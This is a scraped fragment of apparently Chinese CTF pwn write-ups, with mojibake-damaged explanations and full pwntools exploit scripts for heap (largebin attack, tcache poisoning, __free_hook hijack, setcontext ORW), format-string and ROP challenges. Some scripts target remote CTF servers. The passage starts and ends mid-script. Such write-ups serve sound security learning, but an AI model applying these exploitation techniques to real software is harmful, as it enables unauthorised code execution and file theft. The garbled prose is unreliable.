edit(0,payload)

delete(2) #ÂàÜÈÖçchunk2 Âà∞unsortedbin

add(15,0x900) #ÂàÜÈÖç‰∏Ä‰∏™Â§ßÂ†ÜÂùóÂá∫Âèëlargebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #Âõ∫ÂÆöÂÅèÁßª
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #Âä´ÊåÅfree_hook‰∏∫systemÂáΩÊï∞ÔºåfreeÊéâ&amp;quot;/bin/sh&amp;quot;Â†ÜÂùóÂç≥ÂèØ

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;note_context&#34;&gt;note_context:&lt;/h3&gt;
&lt;p&gt;largebin attack+mp_.tcache_bins+setcontext&lt;br&gt;
‰∏ä‰∏ÄÈÅìlarge_noteË∑üÁùÄÂÆòÊñπwpËµ∞Êúâ‰∏çÂ∞ëÁñëÊÉëÔºå‰∏çÂæó‰∏çÂêêÊßΩ‰∏Ä‰∏ãËÆ©‰∫∫‰∫ëÈáåÈõæÈáåÁöÑ&lt;br&gt;
ËøôÈÅìÈ¢òËÆ§ÁúüÁöÑËµ∞‰∫Ü‰∏ÄÈÅçÊµÅÁ®ãÔºåËß£ÂÜ≥‰∫Ü‰∏Ä‰∫õÁñëÊÉë&lt;br&gt;
ÂºÄÂêØÊ≤ôÁõíÔºåÁ¶ÅÁî®&lt;code&gt;execve&lt;/code&gt;Âíå&lt;code&gt;execveat&lt;/code&gt;ÔºåÊâìorw&lt;br&gt;
ËèúÂçïÈ¢òÂäüËÉΩÈΩêÂÖ®Ôºå‰ΩÜÊòØÁî≥ËØ∑Â†ÜÂùóÂ§ßÂ∞èËåÉÂõ¥Âú®largebin‰∏≠&lt;br&gt;
Êú¨È¢òÊîªÂáª&lt;code&gt;mp_.tcache_bins&lt;/code&gt;Ôºålargebin attackÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜô&lt;br&gt;
ÂèØ‰ª•Áî≥ËØ∑Âà∞&lt;code&gt;mp_.tcache_bins&lt;/code&gt;Â§ÑÔºåÊ≠§Êó∂ÂèØËßÅ‰∏Ä‰∏™Â†ÜÂú∞ÂùÄË¶ÜÁõñ‰∫ÜÂéüÊù•ÁöÑ0x40(tcachebinÊï∞Èáè)&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687500325143.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âõ†Ê≠§‰πãÂêéÈáäÊîæÁöÑÂú®largebinÂ§ßÂ∞èËåÉÂõ¥ÁöÑÂ†ÜÂùó‰πü‰ºöË¢´tcachebinÁÆ°Ëæñ&lt;br&gt;
Âõ†Ê≠§ÂèØ‰ª•Êâìtcachebin posioningÔºåÂèØ‰ª•Âä´ÊåÅ&lt;code&gt;__free_hook&lt;/code&gt;&lt;br&gt;
Áî±‰∫éÂè™ËÉΩÊâìorwÔºåglibc 2.32ÁâàÊú¨‰∏ãÈÄâÊã©‰ΩøÁî®&lt;code&gt;setcontext+61&lt;/code&gt;Âä´ÊåÅÁ®ãÂ∫èÊµÅ&lt;br&gt;
&lt;code&gt;mov rsp,[rdx+0A0h]&lt;/code&gt;ÂèØ‰ª•Âä´ÊåÅrspÂØÑÂ≠òÂô®ÔºåËøõËÄåËææÂà∞ÊéßÂà∂Á®ãÂ∫èÊµÅÁöÑÁõÆÁöÑ&lt;br&gt;
ËÄåÊàë‰ª¨‰ΩøÁî®Âè¶Â§ñ‰∏Ä‰∏™gadgetÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÂÆûÁé∞Ë∞ÉÁî®&lt;code&gt;[rdx+0x20]&lt;/code&gt;Â§ÑÁöÑÊåá‰ª§ÁöÑ‰ΩúÁî®Ôºå&lt;br&gt;
Ë∞ÉÁî®&lt;code&gt;__free_hook&lt;/code&gt;Êó∂Â∞Ü‰º†ÂÖ•ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰º†ÂÖ•rdi&lt;br&gt;
Âõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•Â∞ÜË¶ÅdeleteÁöÑÂ†ÜÂùó‰∏≠Â°´ÂÖ•&lt;code&gt;p64(0)+p64(addr)&lt;/code&gt;ÔºåÂ∞ÜaddrÁöÑÂÄº‰º†ÂÖ•rdxÂØÑÂ≠òÂô®‰∏≠ÔºåÊúÄÁªàË∞ÉÁî®&lt;code&gt;[addr+0x20]&lt;/code&gt;ÁöÑÊåá‰ª§ÔºåÂêëËØ•Âú∞ÂùÄÂ°´ÂÖ•&lt;code&gt;setcontext+61&lt;/code&gt;ÁöÑÂú∞ÂùÄ&lt;br&gt;
Âú®ÂΩìÂâçpayloadÁöÑ0xa0ÂÅèÁßªÂ§ÑÂ∏ÉÁΩÆorwÂú∞ÂùÄÔºåÂèØ‰ª•Âä´ÊåÅrspÂØÑÂ≠òÂô®Âà∞orw ropÈìæ‰∏äÔºå‰∏çË¶ÅÂøò‰∫ÜorwÂêéË∑ü‰∏™retÂú∞ÂùÄÊù•ÂºπÊ†àÊâßË°å&lt;/p&gt;
&lt;p&gt;Ê≠§È¢òÈúÄË¶ÅÊ≥®ÊÑèÁî≥ËØ∑Â†ÜÂùóÂ§ßÂ∞èÂú®largebinËåÉÂõ¥ÂÜÖÔºåËÄå&lt;code&gt;tcachebin-&amp;gt;next&lt;/code&gt;ÁöÑÊåáÈíàÂºÇÊàñÂä†ÂØÜÂú®ÊØè0x1000ÁöÑËåÉÂõ¥ÂÜÖÁõ∏ÂêåÔºà&amp;gt;&amp;gt;12Ê≠£Â•ΩÊäπÂéªÊú´‰∏â‰ΩçÔºâÔºåÊâÄ‰ª•Â§ß‰∫é0x1000ÁöÑÊÉÖÂÜµÂæàÂÆπÊòìÂá∫Áé∞ÔºåÂõ†Ê≠§ÂèØ‰ª•Áõ¥Êé•Áî®nextÊåáÈíàÂºÇÊàñÁõÆÊ†áÂú∞ÂùÄÊù•ÁªïËøáÊ£ÄÊü•&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mp_.tcache_bins&lt;/code&gt;ÁöÑÂÅèÁßªÂèØ‰ª•Áõ¥Êé•&lt;code&gt;vmmap&lt;/code&gt;ÊâæÂá∫Â†ÜÂü∫ÂùÄ&lt;br&gt;
ÁÑ∂Âêé‰ΩøÁî®&lt;code&gt;search -8 Â†ÜÂü∫ÂùÄ&lt;/code&gt;&lt;br&gt;
Âú®libc.so‰∏äÁöÑÂú∞ÂùÄ+0x8Âç≥ÊòØÁúüÂÆûÂú∞ÂùÄ&lt;br&gt;
ÂÅèÁßª&lt;code&gt;dist&lt;/code&gt;Âç≥ÂèØ&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28878)
io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

#sandbox on  
def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

### leak libc
add(0,0x560) #0
add(14,0x540) #14
add(1,0x540) #1
delete(0)
edit(0,b&amp;quot;A&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-65-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
###

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+61
mprotect=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
mp_=leak_addr+0x1e32d0
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2ac3f
pop_rdi=leak_addr+0x2858f
pop_rdx_r12=leak_addr+0x114161
pop_rax=leak_addr+0x45580
ret=leak_addr+0x26699

magic_gadget=leak_addr+0x14b760 
&#39;&#39;&#39;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]
&#39;&#39;&#39;

### leak heap
edit(0,b&amp;quot;\x00&amp;quot;)
add(2,0x900) #2
edit(0,b&amp;quot;A&amp;quot;*0xf+b&amp;quot;B&amp;quot;)
show(0)
io.recvuntil(b&amp;quot;B&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x290
key=heap_addr&amp;gt;&amp;gt;12
ck_next=heap_addr+0x24d0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;,hex(key))
###


### largebin attack
payload=p64(leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+0x70)*2
payload+=p64(mp_-0x20)*2
edit(0,payload)

delete(1)
add(3,0x900) #3
###

### hijack __free_hook
add(4,0x900) #4
add(5,0x900) #5

delete(5)
delete(4)
edit(4,p64((ck_next&amp;gt;&amp;gt;12)^free_hook))
add(4,0x900)
add(5,0x900)
edit(5,p64(magic_gadget))
###
stack_addr=heap_addr+0x36f0
orw_addr=heap_addr+0x3f00


#open
orw=p64(pop_rdi)+p64(stack_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


stack=b&amp;quot;./flag\x00\x00&amp;quot;+p64(0)*3+p64(setcontext_61)
stack=stack.ljust(0xa0,b&amp;quot;\x00&amp;quot;)
stack+=p64(orw_addr)+p64(ret)

add(6,0x800) #6
edit(6,stack)

add(7,0x800) #7
edit(7,orw)

# gdb.attach(io)
# pause()

add(8,0x700) #8
edit(8,p64(0)+p64(stack_addr))
delete(8)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week3 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/snl1IsNFg/"" data-c="
          &lt;p&gt;&lt;s&gt;ËÄÉÂÆåÊï∞Âü∫ÊÑüËßâÂú®ÊåÇÁßëËæπÁºò&lt;/s&gt;&lt;br&gt;
ÂÅö‰∏ÄÈÅìÈùûÊ†à‰∏äÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÔºåÂΩì‰ΩúÂä†Ê∑±Ê≠§Á±ªÈ¢òÁõÆÂç∞Ë±°&lt;br&gt;
Ê≠§È¢ò‰ΩøÁî®glibcÁâàÊú¨ 2.35-0ubuntu3.1ÔºåÈ´òÁâàÊú¨‰∏ãÁõ¥Êé•retÊâìone_gadgetÈôêÂà∂ËæÉÂ§ö&lt;br&gt;
Ê≠§È¢òÈááÁî®ÂêëretÂú∞ÂùÄÂÜôÂÖ•ropÈìæÊù•ÂèñÂæóshell&lt;br&gt;
ÈùûÊ†à‰∏äÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÈááÁî®ÈöîÁ©∫ÊâìÁâõÁöÑÊñπÊ≥ïÔºåÊåâÁÖßËøôÊ†∑ÁöÑËßÑÂàôÊâæÂÅèÁßªÂç≥ÂèØ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157672853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§È¢òÊòØÊó†ÈôêÂæ™ÁéØÔºåÂèØ‰ª•‰∏çÁî®ËÄÉËôëÂÜôÂÖ•Ê¨°Êï∞ÁöÑÈóÆÈ¢ò&lt;br&gt;
‰ΩÜÊòØÊ≠§È¢òËá™ÂÆö‰πâÁöÑÂáΩÊï∞ÂøÖÈ°ª‰øùËØÅÊØè‰∏ÄÊ¨°ÂÜôÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶Áõ∏ÂêåÔºåÂê¶Âàô‰ºöÂá∫Áé∞ÂÜôÂ≠óËäÇ‰∏çÂ§üÊàñËÄÖË∂ÖÂá∫ËåÉÂõ¥ÂÜô&lt;code&gt;\x01&lt;/code&gt;ÁöÑÈóÆÈ¢òÔºàÂÖ∂ÂÆû‰∏çÁî®Ëá™ÂÆö‰πâÂáΩÊï∞Â∞±Ê≤°ÈóÆÈ¢ò‰∫Ü&lt;br&gt;
Â¶Ç‰∏ãÂõæretÂú∞ÂùÄÂÜôÂÖ•Âá∫ÈîôÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157529064.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28950)
# io=process(&amp;quot;./fmtstr&amp;quot;)
elf=ELF(&amp;quot;./fmtstr&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;answer: \n&amp;quot;,b&amp;quot;y&amp;quot;)

#leak libc
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%29$p&amp;quot;
io.send(payload)
leak_addr=int(io.recv(14),16)-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

# ret=0x40101a
ret=leak_addr+0x29cd6
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

# gdb.attach(io)
# pause()

#leak stack
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%13$p&amp;quot;
io.send(payload)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr:&amp;quot;,hex(stack_addr))
ret_addr=stack_addr-0x110
print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))

def fmt_t(addr,ctt,off1,off2):
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1))
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2))
    
    for i in range(5):
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))

fmt_t(ret_addr,ret,13,43)
fmt_t(ret_addr+0x8,pop_rdi,13,43)
fmt_t(ret_addr+0x10,str_sh,13,43)
fmt_t(ret_addr+0x18,sys_addr,13,43)

print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))
print(&amp;quot;ret:&amp;quot;,hex(ret))
print(&amp;quot;pop_rdi:&amp;quot;,hex(pop_rdi))
print(&amp;quot;str_sh:&amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr:&amp;quot;,hex(sys_addr))

io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK4]fmtstr_level4 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7WbYV0o_m/"" data-c="
          &lt;p&gt;ÊäïÊú∫ÂèñÂ∑ß‰∫ÜÔºåÂú®nss‰∏äÂ§çÁé∞ÁöÑÁõ¥Êé•ÁåúÁõÆÂΩï‰∫Ü&lt;br&gt;
ÂèØ‰ª•Áî®&lt;code&gt;mprotect&lt;/code&gt;ÂºÄrwxÊÆµÔºå‰πüÂèØ‰ª•Áõ¥Êé•orw_rop&lt;br&gt;
ÂºÄÂêØÊ≤ôÁõíÁ¶ÅÁî®Â∏∏ËßÅÁ¶ÅÁî®ÁöÑË∞ÉÁî®ÔºåËøòÊúâ&lt;code&gt;openat&lt;/code&gt;Ôºå‰∏çËÉΩÁî®&lt;code&gt;open&lt;/code&gt;Â∫ìÂáΩÊï∞ÔºåsyscallÂèØ‰ª•&lt;br&gt;
Ê≥®ÊÑèÁî®&lt;code&gt;syscall;ret&lt;/code&gt;&lt;br&gt;
ÂçäÊàêÂìÅexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28413)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;libc2.so&amp;quot;)

leave_ret=0x4012c8
pop_rdi=0x401443
pop_rsi_r15=0x401441
bss_addr=0x404060+0x900 

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)


payload=cyclic(0x38)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;write&amp;quot;])+p64(0)+p64(elf.plt[b&amp;quot;write&amp;quot;])+p64(0x401311)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;write&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
pop_rsi=leak_addr+0x23eea
pop_rdx=leak_addr+0x1b96
pop_rax=leak_addr+0x43ae8
# syscall=leak_addr+0x13c0
syscall_ret=leak_addr+0xd2745

# gdb.attach(io)
# pause()

# # mprotect()
# io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
# io.recvuntil(b&amp;quot;?\n&amp;quot;)
# payload=cyclic(0x38)+p64(pop_rdi)+p64(0x404000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
# io.send(payload)

#open
# orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
orw=p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(write_a)

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(0x50)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x401311)
io.send(payload)
io.send(b&amp;quot;./flag&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)
payload=cyclic(0x38)+orw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401440 : pop r14 ; pop r15 ; ret
# 0x0000000000401442 : pop r15 ; ret
# 0x000000000040143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 0x000000000040143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012b2 : ret 0x2be
# 0x00000000004013ae : ret 0x8d48

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">2022_hgame_oldfashion_orw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bcvKCEmR-/"" data-c="
          &lt;p&gt;&lt;s&gt;Â§ç‰π†‰∏çÂÆå‰∫ÜÊ≤ÉÊó•&lt;/s&gt;&lt;br&gt;
glibc 2.31-0ubuntu9.8ÔºåÁº∫Â∞ë&lt;code&gt;edit()&lt;/code&gt;ÁöÑËèúÂçïÈ¢ò&lt;br&gt;
ÊúâÊ≤ôÁõí‰øùÊä§Á¶ÅÁî®‰∫Ü&lt;code&gt;execve()&lt;/code&gt;ÔºåÂπ∂‰∏îÁ®ãÂ∫èÁ¶ÅÁî®‰∫Ü&lt;code&gt;__malloc_hook&lt;/code&gt;Âíå&#39;__free_hook&#39;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686898228404.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§È¢ò‰æùÊóßÊâìÂ†ÜÊ†àÁªìÂêàÁöÑorw ropÔºå‰∏çËøáÊ≠§È¢òÊúâ‰∏î‰ªÖÊúâ‰∏ÄÊ¨°uafÁöÑÊú∫‰ºöÂú®&lt;code&gt;case 666&lt;/code&gt;‰∏≠Ôºå&lt;code&gt;show()&lt;/code&gt;‰πüÂè™ËÉΩ‰ΩøÁî®‰∏ÄÊ¨°ÔºåÂèØ‰ª•Â∞ÜËøô‰∏ÄÊ¨°Êú∫‰ºöÁî®Êù•Ê≥ÑÈú≤libc&lt;br&gt;
‰∏çËøáÊâìÂ†ÜÊ†àÁªìÂêàÁöÑrop‰ªçÈúÄÁü•ÈÅìÊ†àÂú∞ÂùÄÔºå‰∫éÊòØÊàë‰ª¨ÂèØ‰ª•ËÄÉËôëÂä´ÊåÅÂ†ÜÂà∞&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;Â§ÑÊ≥ÑÈú≤&lt;code&gt;__environ&lt;/code&gt;Â≠òÂÇ®ÁöÑÊ†àÂú∞ÂùÄÔºå‰πãÂêéÊµãÁÆóÂà∞&lt;code&gt;add()&lt;/code&gt;ÁöÑretÂú∞ÂùÄÂÅèÁßª‰∏∫0x120ÔºåÊàë‰ª¨ÂèØ‰ª•Âä´ÊåÅÂà∞&lt;code&gt;ret-0x128&lt;/code&gt;Â§Ñ,‰∏∫&lt;code&gt;./flag\x00\x00&lt;/code&gt;È¢ÑÁïôÁ©∫Èó¥&lt;br&gt;
Ê≠§È¢òÈ∫ªÁÉ¶ÁöÑÊòØoverlap chunkÁöÑÂàõÂª∫&lt;br&gt;
ÂèØËßÅexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28678)
io=process(&amp;quot;./pwn&amp;quot;)   #Á¶ÅÁî®hookÔºåÁ¶ÅÁî®execve
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,cc): #ÊúÄÂ§ß0x90
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: \n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: \n&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def show(n):    #Âè™ËÉΩ‰ΩøÁî®‰∏ÄÊ¨°
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

def gt(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;idx: \n&amp;quot;,str(n))

gdb.attach(io)
pause()

for i in range(9):
    add(0x90,b&amp;quot;aaa&amp;quot;)  #‰∏∫‰∫ÜÂêéÁª≠ÊûÑÈÄ†overlap chunkÂ§öÂàÜÈÖç‰∏Ä‰∏™Â†ÜÂùó
    
add(0x90,b&amp;quot;bbb&amp;quot;) #9

for i in range(7):
    delete(i)

gt(8)
show(8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))


open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
stdout=leak_addr+libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
pop_rdi=leak_addr+0x23b6a 
pop_rdx=leak_addr+0x142c92
pop_rax=leak_addr+0x36174
pop_rsi=leak_addr+0x2601f 
ret=leak_addr+0x22679


delete(7) #chunk 7‰∏éunsortedbinÂêàÂπ∂  chunk overlap
add(0x90,b&amp;quot;zzz&amp;quot;) #0 Â∞ÜtcachebinÊï∞ÈáèÂáèÂ∞ëÂà∞6Ôºå‰∏∫unsortedbinÈ¢ÑÁïôtcachebin


delete(8) #UAFÂ∞ÜunsortedbinÊîæÂÖ•tcachebin‰∏≠
add(0x80,b&amp;quot;aaa&amp;quot;) #1
add(0x80,p64(0)+p64(0xa1)+p64(stdout)) #2
add(0x90,b&amp;quot;eee&amp;quot;) #3
add(0x90,p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)*2) #4

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

ret_addr=stack_addr-0x128 #ÂÅèÁßª‰∏∫0x120ÔºåÈ¢ùÂ§ñÁöÑ0x8ÂÜô./flagÂ≠óÁ¨¶‰∏≤

#open
